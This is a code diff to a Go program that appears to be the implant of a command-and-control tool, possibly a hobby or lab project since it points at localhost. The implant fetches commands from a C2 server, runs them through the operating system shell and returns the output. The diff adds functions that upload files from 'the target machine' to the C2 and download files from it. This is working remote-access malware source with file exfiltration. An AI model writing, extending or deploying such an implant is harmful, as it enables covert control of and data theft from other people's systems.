@@ -5,11 +5,14 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -19,6 +22,8 @@ const host = "https://localhost"
 const port = 4433
 const getCmdURL = "/getcmd"
 const cmdOutputURL = "/cmdoutput"
+const uploadFileURL = "/upload"
+const downloadFileURL = "/download"
 
 // SetupClient sets up the client object with the self-signed cert
 // and returns it.
@@ -65,11 +70,89 @@ func ProcessCmd(client *http.Client, cmd string, host string) {
 	if strings.Compare(cmd, "quit") == 0 {
 		fmt.Println("[+] Quitting due to quit cmd from c2")
 		os.Exit(0)
+	} else if strings.Contains(cmd, "upload") {
+		filePath := strings.Split(cmd, " ")[1]
+		UploadFile(client, host+uploadFileURL, filePath)
+	} else if strings.Contains(cmd, "download") {
+		cmdTokens := strings.Split(cmd, " ")
+		remoteFile := cmdTokens[1]
+		localFileName := cmdTokens[2]
+		DownloadFile(client, host+downloadFileURL+"?file="+remoteFile, localFileName)
 	} else {
 		out := ExecAndGetOutput(string(cmd))
 		fmt.Printf("[+] Sending back output:\n%s\n", string(out))
 		client.Post(host+cmdOutputURL, "text/html", bytes.NewBuffer(out))
 	}
+}
+
+// UploadFile uploads a local file on the target machine to the c2.
+func UploadFile(client *http.Client, url string, filePath string) {
+	// open the file of interest
+	file, err := os.Open(filePath)
+	if err != nil {
+		fmt.Printf("[-] Error opening file: %s\n", err)
+		return
+	}
+	defer file.Close()
+
+	// create the form file
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+	part, err := writer.CreateFormFile("uploadFile", filepath.Base(filePath))
+	if err != nil {
+		fmt.Printf("[-] Error creating form file: %s\n", err)
+		return
+	}
+	_, err = io.Copy(part, file)
+	err = writer.Close()
+	if err != nil {
+		fmt.Printf("[-] Error closing the multipart writer: %s\n", err)
+		return
+	}
+
+	// create the request
+	req, err := http.NewRequest("POST", url, body)
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	if err != nil {
+		fmt.Printf("[-] Error creating the request: %s\n", err)
+		return
+	}
+
+	// send it off
+	_, err = client.Do(req)
+	if err != nil {
+		fmt.Printf("[-] Error sending upload request: %s\n", err)
+		return
+	}
+	fmt.Println("[+] Uploaded file.")
+}
+
+// DownloadFile downloads a file from the c2 to the local target machine.
+func DownloadFile(client *http.Client, url string, filePath string) {
+	// get the file data
+	fmt.Println(url)
+	resp, err := client.Get(url)
+	if err != nil {
+		fmt.Printf("[-] Error getting file to download from c2: %s\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// create local file
+	out, err := os.Create("downloads/" + filePath)
+	if err != nil {
+		fmt.Printf("[-] Error creating local file: %s\n", err)
+		return
+	}
+	defer out.Close()
+
+	// and write data to it
+	_, err = io.Copy(out, resp.Body)
+	if err != nil {
+		fmt.Printf("[-] Error writing to local file: %s\n", err)
+		return
+	}
+	fmt.Println("[+] Successfully downloaded file")
 }
 
 // ExecAndGetOutput executes the command string on the OS
